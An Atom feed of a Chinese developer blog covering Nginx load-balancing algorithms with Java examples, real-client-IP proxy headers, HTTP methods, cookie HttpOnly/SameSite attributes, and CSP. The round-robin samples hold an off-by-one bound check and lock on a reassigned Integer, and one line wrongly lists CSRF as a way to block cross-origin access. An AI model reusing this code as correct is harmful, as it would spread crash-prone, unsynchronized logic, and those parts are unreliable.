<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Doublekai的博客</title>
  
  <subtitle>蜗牛的爬行！</subtitle>
  <link href="https://www.doublekai.com/atom.xml" rel="self"/>
  
  <link href="https://www.doublekai.com/"/>
  <updated>2021-08-18T09:13:18.610Z</updated>
  <id>https://www.doublekai.com/</id>
  
  <author>
    <name>DOUBLEKAI</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>nginx高性能原因</title>
    <link href="https://www.doublekai.com/2021/08/18/nginx%E9%AB%98%E6%80%A7%E8%83%BD%E5%8E%9F%E5%9B%A0/"/>
    <id>https://www.doublekai.com/2021/08/18/nginx%E9%AB%98%E6%80%A7%E8%83%BD%E5%8E%9F%E5%9B%A0/</id>
    <published>2021-08-18T09:10:29.000Z</published>
    <updated>2021-08-18T09:13:18.610Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>nginx负载均衡算法</title>
    <link href="https://www.doublekai.com/2021/08/18/nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95/"/>
    <id>https://www.doublekai.com/2021/08/18/nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AE%97%E6%B3%95/</id>
    <published>2021-08-18T06:10:05.000Z</published>
    <updated>2021-08-18T09:13:16.113Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Nginx的背景"><a href="#Nginx的背景" class="headerlink" title="Nginx的背景"></a>Nginx的背景</h4><p>Nginx和Apache一样都是一种WEB服务器。基于REST架构风格，以URI（Uniform Resources Identifier，统一资源描述符）或URL（Uniform Resources Locator，统一资源定位符）作为沟通依据，通过HTTP协议提供各种网络服务。WEB服务器的设计受网络规模、网络带宽、产品特点等因素局限，且各自的定位和发展不同，因此各种WEB服务器有着各自的鲜明特点。</p><p>Apache的发展时期很长，而且是毫无争议的世界第一大服务器。它有着很多特点：稳定、开源、跨平台等。它出现的时间太长了，它兴起的年代，互联网产业远远比不上现在，所以它被设计为一个重量级的WEB服务器，不支持高并发。在Apache上运行数以万计的并发访问，会导致服务器消耗大量内存。操作系统对其进行进程或线程间的切换也消耗了大量的CPU资源，导致HTTP请求的平均响应速度降低。这些因素都决定了Apache不可能称为高性能的WEB服务器，因此轻量级的高并发服务器Nginx就登上了舞台。</p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>代理：在访问google的时候会请求失败，而国外的服务器能访问,所以访问google方式为</p><blockquote><p>User -&gt; 国外服务器 -&gt;google</p></blockquote><p>国外服务器就是代理这个过程也称为正向代理<br>反向代理：<br>简单的在拨打110的时候你会发现打到的是离你最近的一个派出所，简单理解就是</p><blockquote><p>User -&gt; 110 -&gt;  很多服务器</p></blockquote><p>当我们请求 <a href="http://www.baidu.com/">www.baidu.com</a> 的时候，就像拨打110一样，背后可能有成千上万台服务器为我们服务，但具体是哪一台，你不知道，也不需要知道，你只需要知道反向代理服务器是谁就好了，<a href="http://www.baidu.com/">www.baidu.com</a> 就是我们的反向代理服务器，反向代理服务器会帮我们把请求转发到真实的服务器那里去。Nginx就是性能非常好的反向代理服务器，用来做负载均衡。</p><h4 id="负载均衡算法"><a href="#负载均衡算法" class="headerlink" title="负载均衡算法"></a>负载均衡算法</h4><p>初始化代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private static Map&lt;String, Integer&gt; serviceWeightMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">static &#123;</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.100&quot;, 1);</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.101&quot;, 1); </span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.102&quot;, 5);//权重为5</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.103&quot;, 1);</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.104&quot;, 1);       </span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.105&quot;, 4);//权重为4</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.106&quot;, 1);      </span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.107&quot;, 2);//权重为2</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.108&quot;, 1);</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.109&quot;, 1);</span><br><span class="line">    serviceWeightMap.put(&quot;192.168.1.110&quot;, 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过实例化一个serviceWeightMap的Map变量来服务器地址和权重的映射，以此来模拟轮询算法的实现，其中设置的权重值在以后的加权算法中会使用到，这里先不做过多介绍，该变量初始化如下：</p><ol><li><p>随机：负载均衡方法随机的把负载分配到各个可用的服务器上，通过随机数生成算法选取一个服务器，然后把连接发送给它。虽然许多均衡产品都支持该算法，但是它的有效性一直受到质疑，除非把服务器的可运行时间看的很重。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static String testRandom() &#123;</span><br><span class="line"> </span><br><span class="line">    // 重新创建一个map，避免出现由于服务器上线和下线导致的并发问题</span><br><span class="line">    Map&lt;String, Integer&gt; serverMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">    serverMap.putAll(serviceWeightMap);</span><br><span class="line"> </span><br><span class="line">    //取得IP地址list</span><br><span class="line">    Set&lt;String&gt; keySet = serverMap.keySet();</span><br><span class="line">    ArrayList&lt;String&gt; keyList = new ArrayList&lt;String&gt;();</span><br><span class="line">    keyList.addAll(keySet);</span><br><span class="line"> </span><br><span class="line">    Random random = new Random();</span><br><span class="line">    int randomPos = random.nextInt(keyList.size());</span><br><span class="line">     </span><br><span class="line">    String server = keyList.get(randomPos);</span><br><span class="line">     </span><br><span class="line">    return server;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>轮询：将请求按顺序轮流分配到后台服务器上，均衡的对待每一台服务器，而不关心服务器实际的连接数和当前的系统负载。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">private static Integer pos = 0;</span><br><span class="line"> </span><br><span class="line">public static String testRoundRobin() &#123;</span><br><span class="line">     </span><br><span class="line">    // 重新创建一个map，避免出现由于服务器上线和下线导致的并发问题</span><br><span class="line">    Map&lt;String, Integer&gt; serverMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">    serverMap.putAll(serviceWeightMap);</span><br><span class="line">     </span><br><span class="line">    //取得IP地址list</span><br><span class="line">    Set&lt;String&gt; keySet = serverMap.keySet();</span><br><span class="line">    ArrayList&lt;String&gt; keyList = new ArrayList&lt;String&gt;();</span><br><span class="line">    keyList.addAll(keySet);</span><br><span class="line">     </span><br><span class="line">    String server = null;</span><br><span class="line">     </span><br><span class="line">    synchronized (pos) &#123;</span><br><span class="line">        if (pos &gt; keySet.size()) &#123;</span><br><span class="line">            pos = 0;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        server = keyList.get(pos);</span><br><span class="line">         </span><br><span class="line">        pos++;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    return server;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>加权轮询：该算法中，每个机器接受的连接数量是按权重比例分配的。这是对普通轮询算法的改进，比如你可以设定：第三台机器的处理能力是第一台机器的两倍，那么负载均衡器会把两倍的连接数量分配给第3台机器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public static String testWeightRoundRobin() &#123;</span><br><span class="line"> </span><br><span class="line">    // 重新创建一个map，避免出现由于服务器上线和下线导致的并发问题</span><br><span class="line">    Map&lt;String, Integer&gt; serverMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">    serverMap.putAll(serviceWeightMap);</span><br><span class="line"> </span><br><span class="line">    //取得IP地址list</span><br><span class="line">    Set&lt;String&gt; keySet = serverMap.keySet();</span><br><span class="line">    Iterator&lt;String&gt; it = keySet.iterator();</span><br><span class="line"> </span><br><span class="line">    List&lt;String&gt; serverList = new ArrayList&lt;String&gt;();</span><br><span class="line"> </span><br><span class="line">    while (it.hasNext()) &#123;</span><br><span class="line">        String server = it.next();</span><br><span class="line">        Integer weight = serverMap.get(server);</span><br><span class="line">        for (int i=0; i&lt;weight; i++) &#123;</span><br><span class="line">            serverList.add(server);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    String server = null;</span><br><span class="line"> </span><br><span class="line">    synchronized (pos) &#123;</span><br><span class="line">        if (pos &gt; serverList.size()) &#123;</span><br><span class="line">            pos = 0;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        server = serverList.get(pos);</span><br><span class="line">        pos++;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    return server;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><p> 源地址哈希(Hash)法：源地址哈希的思想是获取客户端访问的ip地址值，通过哈希函数计算得到一个数值，用该数值对服务器列表的大小进行取模运算，得到的结果便是要访问的服务器的序号。采用哈希法进行负载均衡，同一ip地址的客户端，当后端服务器列表不变的时候，它每次都会被映射到同一台后端服务器进行访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public static String testConsumerHash(String remoteIp) &#123;</span><br><span class="line"> </span><br><span class="line">    // 重新创建一个map，避免出现由于服务器上线和下线导致的并发问题</span><br><span class="line">    Map&lt;String, Integer&gt; serverMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">    serverMap.putAll(serviceWeightMap);</span><br><span class="line"> </span><br><span class="line">    //取得IP地址list</span><br><span class="line">    Set&lt;String&gt; keySet = serverMap.keySet();</span><br><span class="line">    ArrayList&lt;String&gt; keyList = new ArrayList&lt;String&gt;();</span><br><span class="line">    keyList.addAll(keySet);</span><br><span class="line">     </span><br><span class="line">    int hashCode = remoteIp.hashCode();</span><br><span class="line">    int pos = hashCode % keyList.size();</span><br><span class="line">     </span><br><span class="line">    return keyList.get(pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最快算法：最快算法基于所有服务器中的最快响应时间分配连接。该算法在服务器跨不同网络的环境中特别有用。</p></li><li><p>最少连接：系统把新连接分配给当前连接数目最少的服务器。该算法在各个服务器运算能力基本相似的环境中非常有效。</p></li><li><p>观察算法：该算法同时利用最小连接算法和最快算法来实施负载均衡。服务器根据当前的连接数和响应时间得到一个分数，分数较高代表性能较好，会得到更多的连接。</p></li><li><p>预判算法：该算法使用观察算法来计算分数，但是预判算法会分析分数的变化趋势来判断某台服务器的性能正在改善还是降低。具有改善趋势的服务器会得到更多的连接。该算法适用于大多数环境。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Nginx的背景&quot;&gt;&lt;a href=&quot;#Nginx的背景&quot; class=&quot;headerlink&quot; title=&quot;Nginx的背景&quot;&gt;&lt;/a&gt;Nginx的背景&lt;/h4&gt;&lt;p&gt;Nginx和Apache一样都是一种WEB服务器。基于REST架构风格，以URI（Unifo</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>服务器获取浏览器用户真实IP</title>
    <link href="https://www.doublekai.com/2021/08/17/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%8E%B7%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E7%94%A8%E6%88%B7%E7%9C%9F%E5%AE%9EIP/"/>
    <id>https://www.doublekai.com/2021/08/17/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%8E%B7%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E7%94%A8%E6%88%B7%E7%9C%9F%E5%AE%9EIP/</id>
    <published>2021-08-17T01:56:22.000Z</published>
    <updated>2021-08-18T06:09:07.903Z</updated>
    
    <content type="html"><![CDATA[<h5 id="nginx-配置文件中获取源IP的配置项"><a href="#nginx-配置文件中获取源IP的配置项" class="headerlink" title="nginx 配置文件中获取源IP的配置项"></a>nginx 配置文件中获取源IP的配置项</h5><p>proxy_set_header Host $host;<br>proxy_set_header X-Real-IP $remote_addr; #一般的web服务器用这个 X-Real-IP 来获取源IP<br>proxy_set_header x-forwarded-for $proxy_add_x_forwarded_for; #如果nginx 服务器是作为反向代理服务器的，则这个配置项是必须的；否则看不到源IP</p><h5 id="nginx-代理服务器的模块"><a href="#nginx-代理服务器的模块" class="headerlink" title="nginx 代理服务器的模块"></a>nginx 代理服务器的模块</h5><p>nginx 通过 ngx_http_proxy_module模块 实现反向代理；在nginx 启动服务load conf时，<br> 就会读取 proxy_set_header 的配置项；来获取需要的变量。proxy_set_header 是用来设置请求的header的；<br> 比如：设置上面的host  X-Real-IP x-forwarded-for </p><h5 id="3个配置项的含义"><a href="#3个配置项的含义" class="headerlink" title="3个配置项的含义"></a>3个配置项的含义</h5><p>host：只要 用户在浏览器中访问的域名绑定了 VIP VIP 下面有RS；则就用$host ；host是访问URL 中的域名和端口  <a href="http://www.taobao.com/">www.taobao.com:80</a><br>X-real-IP:把源IP 【$remote_addr,建立HTTP连接header里面的信息】赋值给X-Real-IP;</p><p>####环境：nginx做反向代理，apache做后端服务器<br>nginx部分配置代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">upstream apache&#123;</span><br><span class="line">server 127.0.0.1:8080; # 后端真实服务器地址及端口</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">server_name www.a.com;</span><br><span class="line">root /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass http://apache;</span><br><span class="line">proxy_set_header ClientIpGetFromNginx $remote_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量 $remote_addr 代表客户端ip地址<br>nginx反向代理会添加一个请求头<br>proxy_set_header X-Forwarded-For $remote_addr;<br>以此传递客户端ip到后端服务器。<br>此时去查看后端服务器的访问日志如下<br>127.0.0.1 – – [01/Sep/2017:10:31:10 +0800] 后面内容省略···<br>可以看出来访问返回的是nginx也就是Referer上一层的ip，需要在apache日志格式修改<br>LogFormat “%{ClientIpGetFromNginx}i %l %u %t \”%r\” %&gt;s %b \”%{Referer}i\” \”%{User-Agent}i\”” combined</p><h3 id="如何判断移动端浏览器发出的请求并重定向站点"><a href="#如何判断移动端浏览器发出的请求并重定向站点" class="headerlink" title="如何判断移动端浏览器发出的请求并重定向站点"></a>如何判断移动端浏览器发出的请求并重定向站点</h3><p>1、移动端开发需要加入的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;  </span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,  user-scalable=no&quot;,</span><br><span class="line"></span><br><span class="line">maximum-scale=1, minimum-scale=1&gt;</span><br></pre></td></tr></table></figure><p>2、判断移动端还是PC端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function browserRedirect() &#123;</span><br><span class="line">                var ua= navigator.userAgent.toLowerCase();</span><br><span class="line">                var ipad= ua.match(/ipad/i) == &quot;ipad&quot;;</span><br><span class="line">                var iphone= ua.match(/iphone os/i) == &quot;iphone os&quot;;</span><br><span class="line"></span><br><span class="line">                var mid= ua.match(/midp/i) == &quot;midp&quot;;</span><br><span class="line"></span><br><span class="line">//midp，即Mobile Internet Device pad，一种新的“比智能电话大，比笔记本小”的互联网终端。</span><br><span class="line"></span><br><span class="line">                var uc7= ua.match(/rv:1.2.3.4/i) == &quot;rv:1.2.3.4&quot;;</span><br><span class="line">                var uc= ua.match(/ucweb/i) == &quot;ucweb&quot;;</span><br><span class="line">                var android= ua.match(/android/i) == &quot;android&quot;;</span><br><span class="line">                var ce= ua.match(/windows ce/i) == &quot;windows ce&quot;;</span><br><span class="line">                var mobile= ua.match(/windows mobile/i) == &quot;windows mobile&quot;;</span><br><span class="line">                if (ipad|| iphone|| mid|| uc7|| uc || android|| ce|| mobile) &#123;</span><br><span class="line">                    //跳转移动端页面</span><br><span class="line">                    window.location.href=&quot;http://www.wanshaobo.com/mobile/index.html&quot;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    //跳转pc端页面</span><br><span class="line">                    window.location.href=&quot;http://www.wanshaobo.com/index.html&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;nginx-配置文件中获取源IP的配置项&quot;&gt;&lt;a href=&quot;#nginx-配置文件中获取源IP的配置项&quot; class=&quot;headerlink&quot; title=&quot;nginx 配置文件中获取源IP的配置项&quot;&gt;&lt;/a&gt;nginx 配置文件中获取源IP的配置项&lt;/h5&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HTTP协议中的OPTIONS</title>
    <link href="https://www.doublekai.com/2021/08/09/HTTP%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84OPTIONS/"/>
    <id>https://www.doublekai.com/2021/08/09/HTTP%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84OPTIONS/</id>
    <published>2021-08-09T01:46:44.000Z</published>
    <updated>2021-08-17T01:56:43.107Z</updated>
    
    <content type="html"><![CDATA[<p>在http请求方式中有这几种方法1.GET 2.HEAD 3.PUT 4.DELETE 5.POST 6.OPTIONS<br><img src="/images/ops1.png"><br>但其实我们大部分情况下只用到了GET和POST。如果想设计一个符合RESTful规范的web应用程序，则这六种方法都会用到。不过即使暂时不想涉及REST，了解这六种方法的本质仍然是很有作用的。大家将会发现，原来web也是很简洁明了的。下面依次说明这六种方法。</p><p>1，GET：GET可以说是最常见的了，它本质就是发送一个请求来取得服务器上的某一资源。资源通过一组HTTP头和呈现数据（如HTML文本，或者图片或者视频等）返回给客户端。GET请求中，永远不会包含呈现数据。</p><p>2，HEAD：HEAD和GET本质是一样的，区别在于HEAD不含有呈现数据，而仅仅是HTTP头信息。有的人可能觉得这个方法没什么用，其实不是这样的。想象一个业务情景：欲判断某个资源是否存在，我们通常使用GET，但这里用HEAD则意义更加明确。</p><p>3，PUT：这个方法比较少见。HTML表单也不支持这个。本质上来讲， PUT和POST极为相似，都是向服务器发送数据，但它们之间有一个重要区别，PUT通常指定了资源的存放位置，而POST则没有，POST的数据存放位置由服务器自己决定。举个例子：如一个用于提交博文的URL，/addBlog。如果用PUT，则提交的URL会是像这样的”/addBlog/abc123”，其中abc123就是这个博文的地址。而如果用POST，则这个地址会在提交后由服务器告知客户端。目前大部分博客都是这样的。显然，PUT和POST用途是不一样的。具体用哪个还取决于当前的业务场景。</p><p>4，DELETE：删除某一个资源。基本上这个也很少见，不过还是有一些地方比如amazon的S3云服务里面就用的这个方法来删除资源。</p><p>5，POST：向服务器提交数据。这个方法用途广泛，几乎目前所有的提交操作都是靠这个完成。</p><p>6，OPTIONS：这个方法很有趣，但极少使用。它用于获取当前URL所支持的方法。若请求成功，则它会在HTTP头中包含一个名为“Allow”的头，值是所支持的方法，如“GET, POST”。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在http请求方式中有这几种方法1.GET 2.HEAD 3.PUT 4.DELETE 5.POST 6.OPTIONS&lt;br&gt;&lt;img src=&quot;/images/ops1.png&quot;&gt;&lt;br&gt;但其实我们大部分情况下只用到了GET和POST。如果想设计一个符合RESTful规</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cookie中的HttpOnly和SameSite属性</title>
    <link href="https://www.doublekai.com/2021/08/04/Cookie%E4%B8%AD%E7%9A%84HttpOnly%E5%92%8CSameSite%E5%B1%9E%E6%80%A7/"/>
    <id>https://www.doublekai.com/2021/08/04/Cookie%E4%B8%AD%E7%9A%84HttpOnly%E5%92%8CSameSite%E5%B1%9E%E6%80%A7/</id>
    <published>2021-08-04T06:41:55.000Z</published>
    <updated>2021-08-09T01:43:51.486Z</updated>
    
    <content type="html"><![CDATA[<h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>作用：如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，<a href="https://www.doublekai.com/2021/07/19/%E6%B7%B1%E6%8C%96XSS-%E5%92%8CCSRF/">XSS</a>属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p><p>设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取。</p><p>Cookie cookies[]=request.getCookies();  </p><h3 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h3><p>作用：防止<a href="https://www.doublekai.com/2021/07/19/%E6%B7%B1%E6%8C%96XSS-%E5%92%8CCSRF/">CSRF</a>攻击</p><h6 id="SameSite属性"><a href="#SameSite属性" class="headerlink" title="SameSite属性"></a>SameSite属性</h6><p>可以设置三个值。<br>Strict<br>Lax<br>None<br><code>Set-Cookie: CookieName=CookieValue; SameSite=Strict｜Lax｜None;</code></p><ol><li>Strict最为严格，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。</li><li>当这些 链接<code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt; </code>预加载    <code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code>GET 表单    <code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;    </code>会发送cookie其他的post、ajax、image、iframe都不会发送cookie</li><li>Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。<br><code>Set-Cookie: widget_session=&#39;k&#39;; SameSite=None; Secure</code></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;HttpOnly&quot;&gt;&lt;a href=&quot;#HttpOnly&quot; class=&quot;headerlink&quot; title=&quot;HttpOnly&quot;&gt;&lt;/a&gt;HttpOnly&lt;/h3&gt;&lt;p&gt;作用：如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>同源策略与CSP</title>
    <link href="https://www.doublekai.com/2021/08/02/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>https://www.doublekai.com/2021/08/02/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</id>
    <published>2021-08-02T08:49:25.000Z</published>
    <updated>2021-08-04T06:42:52.300Z</updated>
    
    <content type="html"><![CDATA[<h3 id="同源"><a href="#同源" class="headerlink" title="同源"></a>同源</h3><p>如果两个页面的接口协议域名，端口号都相同，它们具有相同的源</p><h6 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h6><p>同源策略就是浏览器 的一个安全限制，它阻止了不同域之间进行的数据交互</p><h6 id="允许跨源访问"><a href="#允许跨源访问" class="headerlink" title="允许跨源访问"></a>允许跨源访问</h6><p>可以使用CORS来允许跨源访问。CORS是HTTP的一部分，它允许服务端来指定哪些主机可以从这个服务端加载资源</p><h6 id="阻止跨源访问"><a href="#阻止跨源访问" class="headerlink" title="阻止跨源访问"></a>阻止跨源访问</h6><p>利用<a href="https://www.doublekai.com/2021/07/19/%E6%B7%B1%E6%8C%96XSS-%E5%92%8CCSRF/">CSRF</a></p><h3 id="CSP（Content-Security-Policy）内容安全策略"><a href="#CSP（Content-Security-Policy）内容安全策略" class="headerlink" title="CSP（Content-Security-Policy）内容安全策略"></a>CSP（Content-Security-Policy）内容安全策略</h3><p>目的：使网站数据更加安全。<br>在前几篇文章讲到网站可以使用<a href="https://www.doublekai.com/2021/07/19/%E6%B7%B1%E6%8C%96XSS-%E5%92%8CCSRF/">xss</a>脚本攻击网站<br>在http请求头中有个<code>Content-Security-Policy</code>参数<br>######一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名)<br><code>Content-Security-Policy: default-src &#39;self&#39;</code><br>######一个网站管理者允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)<br><code>Content-Security-Policy: default-src &#39;self&#39; *.trusted.com</code><br>######一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码.<br><code>Content-Security-Policy: default-src &#39;self&#39;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</code><br>######一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。<br><code>Content-Security-Policy: default-src https://onlinebanking.jumbobank.com</code><br>######一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容(从任意位置加载)。<br><code>Content-Security-Policy: default-src &#39;self&#39; *.mailsite.com; img-src *</code><br>#####下面是一个网站的css请求头<br><img src="/images/csp1.png" alt="csp"><br><code>script-src &#39;self&#39;</code>:定义js文件的过滤策略<br><code>blob: filesystem:;</code>允许blobfilesystem协议内的url<br><code>object-src &#39;self&#39;</code>定义页面插件的过滤策略,如 <object>, <embed> 或者<applet>等元素<code>blob: filesystem:;</code>允许blobfilesystem协议内的url<br>#####下面是收集的一些参数和值</p><p><img src="/images/csp2.png" alt="csp"><br><img src="/images/csp3.png" alt="csp"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;同源&quot;&gt;&lt;a href=&quot;#同源&quot; class=&quot;headerlink&quot; title=&quot;同源&quot;&gt;&lt;/a&gt;同源&lt;/h3&gt;&lt;p&gt;如果两个页面的接口协议域名，端口号都相同，它们具有相同的源&lt;/p&gt;
&lt;h6 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>inode问题</title>
